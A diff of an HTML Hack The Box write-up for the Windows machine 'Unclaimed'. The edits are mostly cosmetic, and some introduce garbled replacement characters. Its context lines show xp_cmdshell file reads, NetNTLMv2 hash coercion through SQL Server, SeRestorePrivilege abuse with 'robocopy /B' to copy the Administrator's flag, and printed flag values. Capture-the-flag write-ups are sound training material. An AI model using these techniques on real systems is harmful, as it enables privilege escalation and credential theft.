@@ -3,19 +3,18 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Unclaimed — HTB Season 12 Writeup (Lanky)</title>
+  <title>Unclaimed - HTB Season 12 Writeup (Lanky)</title>
   <meta name="description" content="Complete Hack The Box Unclaimed walkthrough: reconnaissance, initial access, SQL Server execution, backup operator access, user and root flags, dead ends, and cleanup.">
   <link rel="canonical" href="https://lankylukeaus.github.io/machines/unclaimed.html">
   <link rel="stylesheet" href="../assets/style.css?v=11">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#129523;</text></svg>">
 </head>
 <body>
-  <div class="banner">⚠️ <strong>Full walkthrough and spoilers</strong> — commands, credentials and flag values appear below.</div>
 
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
-      <a class="link" href="../index.html#lab">← all writeups</a>
+      <a class="link" href="../index.html#lab"> all writeups</a>
     </div>
   </header>
 
@@ -30,7 +29,7 @@
     </svg>
 
     <h1 style="margin-top:16px;">Unclaimed</h1>
-    <div class="subtitle">Hack The Box · Season 12 · completed 8 November 2026 · <a href="https://app.hackthebox.com/machines/Unclaimed" target="_blank" rel="noopener">app.hackthebox.com/machines/Unclaimed</a></div>
+    <div class="subtitle">Hack The Box � Season 12 � completed 8 November 2026 � <a href="https://app.hackthebox.com/machines/Unclaimed" target="_blank" rel="noopener">app.hackthebox.com/machines/Unclaimed</a></div>
     <div class="machine-meta">
       <span class="pill newpill" data-added="2026-11-08">NEW</span>
       <span class="pill" style="color:var(--cyan);border-color:rgba(46,230,214,0.35)">Windows</span>
@@ -39,7 +38,7 @@
       <span class="pill rankp">Machine rank #50</span>
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
-      <span class="pill rooted">● Completed</span>
+      <span class="pill rooted">? Completed</span>
     </div>
 
     <div class="callout">
@@ -228,7 +227,7 @@ EXEC xp_cmdshell 'type C:\Users\svc_sql\Desktop\user.txt'
 <p>The flag was submitted immediately and HTB confirmed ownership.</p>
 <h2 id="sql-agent-proxy-discovery"><span class="num">06</span>SQL Agent proxy discovery</h2>
 <p>The Windows account behind SQL Server also authenticated to the local SQL instance through integrated authentication and was a SQL sysadmin:</p>
-<pre data-lang="powershell"><code class="language-powershell">$c = New-Object Data.SqlClient.SqlConnection \
+<pre data-lang="powershell"><code class="language-powershell">$c = New-Object Data.SqlClient.SqlConnection `
   'Server=localhost;Integrated Security=true'
 $c.Open()
 $q = $c.CreateCommand()
@@ -322,10 +321,7 @@ SeRestorePrivilege  Restore files and directories      Enabled
 <p class="callout"><span class="tag">Evidence</span><strong>the remote token could bypass file ACLs through Windows backup semantics.</strong></p>
 <h2 id="root-flag-through-backup-semantics"><span class="num">09</span>Root flag through backup semantics</h2>
 <p><code>robocopy /B</code> was used to copy the protected Administrator flag while explicitly requesting backup mode:</p>
-<pre data-lang="powershell"><code class="language-powershell">robocopy /B \
-  C:\Users\Administrator\Desktop \
-  C:\Users\svc_wtbackup\Documents \
-  root.txt
+<pre data-lang="powershell"><code class="language-powershell">robocopy /B C:\Users\Administrator\Desktop C:\Users\svc_wtbackup\Documents root.txt
 </code></pre>
 <pre data-lang="text"><code class="language-text">Files : root.txt
 New File  34  root.txt
@@ -338,7 +334,7 @@ FAILED : 0
 <pre data-lang="text"><code class="language-text">950c9dbda2fc8d94e7667f2fb6458661
 </code></pre>
 <p><strong>Root flag:</strong> <code>950c9dbda2fc8d94e7667f2fb6458661</code></p>
-<p>HTB accepted the flag and displayed <strong>“You have solved Unclaimed!”</strong> with machine rank <strong>#50</strong>.</p>
+<p>HTB accepted the flag and displayed <strong>"You have solved Unclaimed!"</strong> with machine rank <strong>#50</strong>.</p>
 <h2 id="dead-ends-and-useful-negative-results"><span class="num">10</span>Dead ends and useful negative results</h2>
 <h3>NetNTLMv2 capture</h3>
 <p>Before the support override was identified, SQL Server was coerced to authenticate to Kali by placing <code>sys.dm_os_file_exists()</code> inside an otherwise allowed <code>SELECT</code> statement. This captured a NetNTLMv2 challenge-response for <code>UNCLAIMED\svc_sql</code>.</p>
@@ -359,8 +355,7 @@ FAILED : 0
 <ul>
 <li>Restored <code>PIR Nightly Archive</code> step 1 to:</li>
 </ul>
-<p><code>text
-  cmd /c echo Archiving PIR/AHL/OHD records...</code></p>
+<pre data-lang="text"><code>cmd /c echo Archiving PIR/AHL/OHD records...</code></pre>
 <ul>
 <li>Deleted the temporary SQL Agent job <code>HTBTemp</code>.</li>
 <li>Deleted temporary files <code>C:\Users\Public\agent.txt</code> and <code>C:\Users\Public\bagtrace.txt</code>.</li>
@@ -424,16 +419,15 @@ xp_cmdshell             0
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines">Hack The Box streaming and write-up rules</a></li>
-<li><a href="https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-credential-passwords/">NetSPI — Decrypting MSSQL Credential Passwords</a></li>
-<li><a href="https://learn.microsoft.com/sql/relational-databases/security/authentication-access/credentials-database-engine">Microsoft Learn — SQL Server credentials</a></li>
+<li><a href="https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-credential-passwords/">NetSPI - Decrypting MSSQL Credential Passwords</a></li>
+<li><a href="https://learn.microsoft.com/sql/relational-databases/security/authentication-access/credentials-database-engine">Microsoft Learn - SQL Server credentials</a></li>
 </ul>
 
     <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to Hacking Lab</a></p>
   </article>
 
   <footer>
-    <div class="wrap">Unclaimed · completed · writeup by Luke &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div>
+    <div class="wrap">Unclaimed � completed � writeup by Luke &nbsp;�&nbsp; <a href="../index.html#lab">all writeups</a></div>
   </footer>
 </body>
 </html>
-
